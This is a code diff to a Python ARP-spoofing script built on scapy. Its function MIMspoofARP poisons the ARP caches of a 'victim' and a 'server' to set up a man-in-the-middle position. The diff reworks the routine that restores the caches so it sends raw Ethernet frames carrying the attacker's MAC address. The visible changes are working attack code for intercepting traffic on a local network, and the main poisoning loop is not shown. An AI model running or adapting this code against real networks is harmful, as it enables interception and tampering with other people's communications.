@@ -3,10 +3,6 @@ from scapy.all import ARP, Ether, conf, getmacbyip, get_if_hwaddr, get_if_addr, 
 import time
 import random as rd
 
-
-
-
-
 # macVictim = "ff:ff:ff:ff:ff:ff"
 # ipVictim = "192.168.178.144"
 
@@ -19,7 +15,6 @@ def MIMspoofARP(ipVictim, ipServer):
     macAttacker = get_if_hwaddr(interface)
     ipAttacker = get_if_addr(interface)
     
-
     macVictim = getmacbyip(ipVictim)
     macServer = getmacbyip(ipServer)
 
@@ -55,19 +50,18 @@ def MIMspoofARP(ipVictim, ipServer):
             time.sleep(2)
     except KeyboardInterrupt:
         print("Undoing ARP poisoning")
-        undoARPSpoof(ipVictim, ipServer, macVictim, macServer)
+        undoARPSpoof(ipVictim, ipServer, macVictim, macServer, macAttacker)
 
 
-def undoARPSpoof(ipVictim, ipServer, macVictim, macServer):
-    undoVictim = ARP(hwsrc=macVictim, psrc=ipVictim, hwdst=macServer, pdst=ipServer)
-    undoServer = ARP(hwdst=macVictim, pdst=ipVictim, hwsrc=macServer, psrc=ipServer)
+def undoARPSpoof(ipVictim, ipServer, macVictim, macServer, macAttacker):
+    undoVictim = Ether(src = macAttacker) / ARP(hwsrc=macVictim, psrc=ipVictim, hwdst=macServer, pdst=ipServer)
+    undoServer = Ether(src = macAttacker) / ARP(hwdst=macVictim, pdst=ipVictim, hwsrc=macServer, psrc=ipServer)
 
-    send(Ether(dst=macVictim), undoVictim, count=4, verbose=False)
-    send(Ether(dst=macServer), undoServer, count=4, verbose=False)
+    sendp(undoVictim, iface=interface, verbose=False)
+    sendp(undoServer, iface=interface, verbose=False)
 
 # def prepPacket(targetMAC, targetIP, spoofedIP):
 #     arp1 = ARP(op=2, pdst=targetIP, hwdst=targetMAC, psrc=spoofedIP)
-
 
 if __name__ == "__main__":
     MIMspoofARP(ipVictim, ipServer)
